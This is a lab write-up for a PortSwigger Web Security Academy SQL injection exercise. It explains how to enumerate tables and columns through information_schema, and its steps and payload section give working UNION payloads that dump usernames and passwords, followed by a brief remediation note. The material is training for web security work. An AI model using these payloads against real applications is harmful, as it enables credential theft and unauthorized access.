# Lab 09 — SQL injection attack, listing the database contents on non-Oracle databases

**Category:** SQL Injection
**Difficulty:** Practitioner
**Reference:** https://portswigger.net/web-security/sql-injection/examining-the-database

## Objective
Enumerate unknown table and column names via `information_schema`, then dump the credentials table to log in as administrator.

## Vulnerability
Injectable `category` parameter on a MySQL/MSSQL/PostgreSQL backend, which all expose the standard `information_schema` metadata tables.

## Steps to Reproduce
1. List all table names: `UNION SELECT table_name, NULL FROM information_schema.tables--`
2. Identify a table that looks like it stores credentials (e.g. `users_xxxx`).
3. List its columns: `UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_xxxx'--`
4. Identify the username/password columns and dump them.
5. Log in with the leaked administrator credentials.

## Payload(s) Used
```
category=Gifts' UNION SELECT table_name, NULL FROM information_schema.tables--
category=Gifts' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_xxxx'--
category=Gifts' UNION SELECT username_yyyy, password_zzzz FROM users_xxxx--
```

## Explanation
`information_schema` is a standard, read-only metadata schema present on most non-Oracle RDBMSes, so even with no prior knowledge of the schema, an attacker can walk from table names to column names to the actual sensitive data in three UNION queries.

## Screenshots
_Add your screenshots here, e.g. `./screenshots/sqli-lab-09-01.png`_

## Remediation
Revoke SELECT access to `information_schema` for the application's DB account where possible, and use parameterized queries to prevent injection in the first place.

---
*Lab solved on PortSwigger Web Security Academy. Writeup by Miley.*
